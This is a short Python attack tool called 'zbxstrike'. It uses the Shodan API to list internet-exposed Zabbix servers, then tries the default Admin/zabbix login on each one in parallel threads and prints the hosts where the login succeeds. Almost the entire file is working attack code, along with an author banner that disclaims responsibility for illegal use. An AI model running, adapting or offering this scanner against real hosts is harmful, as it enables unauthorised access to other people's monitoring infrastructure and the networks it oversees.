import shodan
import argparse
from time import sleep
from zabbix_api import ZabbixAPI
from multiprocessing.dummy import Pool as ThreadPool 

class zbxstrike():
    def __init__(self, api_key, thread):
        self.api = shodan.Shodan(api_key)
        self.thread = thread

    def search(self):
        targets_list = []

        try:
            results = self.api.search('zabbix')            
            for result in results['matches']:
                targets_list.append(result['ip_str'])

        except shodan.APIError as e:
            print("Error: {0}".format(e))

        return targets_list

    def test_login(self, host):
        try:
            zapi = ZabbixAPI(server="http://{0}/zabbix".format(host))
            zapi.login("Admin", "zabbix")
            print("[success] - {0} - User: Admin - Pass: zabbix".format(host))
        except:
            pass

    def attack(self):
        targets = self.search()
        pool = ThreadPool(4)

        print("-----------------------------------------------")
        print("Number of targets: {0}".format(len(targets)))
        print("-----------------------------------------------")

        results = pool.map(self.test_login, targets)
        pool.close()
        pool.join()

def banner():
    banner = '''

███████╗██████╗ ██╗  ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗██████╗ 
╚══███╔╝██╔══██╗╚██╗██╔╝██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝██╔══██╗
  ███╔╝ ██████╔╝ ╚███╔╝ ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  ██████╔╝
 ███╔╝  ██╔══██╗ ██╔██╗ ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  ██╔══██╗
███████╗██████╔╝██╔╝ ██╗███████║   ██║   ██║  ██║██║██║  ██╗███████╗██║  ██║
╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

Author: Gabriel Dutra A.K.A Dtrzx
Github: github.com/dtrzx
Email: gabrieldmdutra@gmail.com
Linkedin: https://linkedin.com/in/dtrzx

Date: 8/04/2019

I am not responsible for the illegal use of the tool :)
    '''
    print(banner)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-k', '--key', dest="key", help="Your key for shodan", required=True)
    parser.add_argument('-t', '--thread', dest="thread", help="Number of the threads", default=4, required=False)
    args = parser.parse_args()

    key = args.key 
    thread = args.thread

    zbx = zbxstrike(key, thread)
    zbx.attack()

if __name__=='__main__':
    banner()
    sleep(4)
    main()